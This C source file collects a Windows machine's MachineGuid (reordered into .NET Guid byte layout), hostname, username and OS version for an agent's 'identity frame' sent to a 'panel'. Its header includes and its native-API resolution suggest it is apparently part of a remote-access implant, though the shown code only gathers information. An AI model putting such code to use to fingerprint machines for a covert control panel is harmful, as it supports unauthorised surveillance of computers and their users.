/* system_facts.c - collect what this agent reports about its machine.
 * The identity frame's UUID and printable facts come from here.
 */

#include "system_facts.h"
#include "types.h"
#include "peb.h"
#include "ntdll.h"
#include "system.h"
#include "nativeapi.h"
#include <windows.h>
#include <stdio.h>

/* Get the machine UUID from HKLM\...\Cryptography\MachineGuid, converted to
 * the .NET Guid byte order the panel expects. Falls back to all zeros.
 *
 * The registry stores the UUID as text ("00112233-4455-6677-..."); the
 * panel parses the 16 frame bytes as a .NET Guid, whose first three groups
 * (Data1..Data3) are little-endian and whose last group is raw. Hence the
 * reorder at the end: string order -> 33 22 11 00 | 55 44 | 77 66 | raw. */
void get_machine_uuid(unsigned char out[16])
{
    char text[64] = {0};
    DWORD size = sizeof(text) - 1;

    HKEY key;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography",
                      0, KEY_QUERY_VALUE, &key) == ERROR_SUCCESS) {
        DWORD type = 0;
        if (RegQueryValueExA(key, "MachineGuid", NULL, &type,
                             (LPBYTE)text, &size) != ERROR_SUCCESS ||
            type != REG_SZ)
            text[0] = '\0';
        RegCloseKey(key);
    }

    /* Hex digits (skipping '-', '{', '}') -> 16 bytes in string order. */
    unsigned char straight[16];
    int digits = 0;
    for (const char *p = text; *p != '\0' && digits < 32; p++) {
        int v;
        if (*p >= '0' && *p <= '9')      v = *p - '0';
        else if (*p >= 'a' && *p <= 'f') v = *p - 'a' + 10;
        else if (*p >= 'A' && *p <= 'F') v = *p - 'A' + 10;
        else continue;
        straight[digits / 2] = (unsigned char)((digits % 2 == 0)
                                ? (v << 4) : (straight[digits / 2] | v));
        digits++;
    }
    if (digits != 32) {
        ZeroMemory(out, 16);             /* malformed or missing -> zeros */
        return;
    }

    /* String byte order -> .NET Guid layout (Data1..3 LE, Data4 raw). */
    out[0] = straight[3];  out[1] = straight[2];
    out[2] = straight[1];  out[3] = straight[0];
    out[4] = straight[5];  out[5] = straight[4];
    out[6] = straight[7];  out[7] = straight[6];
    for (int i = 0; i < 8; i++)
        out[8 + i] = straight[8 + i];
}

void collect_system_facts(system_facts *facts)
{
    ZeroMemory(facts, sizeof(*facts));

    NTDLL ntdll;
    KERNEL32 kernel;
    BOOL hasNativeApi = NativeApi_Ctor(&ntdll, &kernel);

    DWORD n = sizeof(facts->hostname);
    if(hasNativeApi){
        kernel.GetComputerNameA(facts->hostname, &n);
    } else {
        facts->hostname[0] = '\0';
    }

    n = sizeof(facts->username);
    GetUserNameA(facts->username, &n);           /* advapi32 */

    /* RtlGetVersion (ntdll) reports the true OS version; the classic
     * GetVersionEx lies to apps without a compatibility manifest. */
    if (hasNativeApi && ntdll.RtlGetVersion) {
        LONG (WINAPI *rtl_get_version)(LPOSVERSIONINFOW) =
            (LONG (WINAPI *)(LPOSVERSIONINFOW))ntdll.RtlGetVersion;
        if (rtl_get_version) {
            OSVERSIONINFOW info;
            ZeroMemory(&info, sizeof(info));
            info.dwOSVersionInfoSize = sizeof(info);
            if (rtl_get_version(&info) == 0)
                snprintf(facts->os_version, sizeof(facts->os_version),
                         "%lu.%lu.%lu", info.dwMajorVersion,
                         info.dwMinorVersion, info.dwBuildNumber);
        }
    }
}
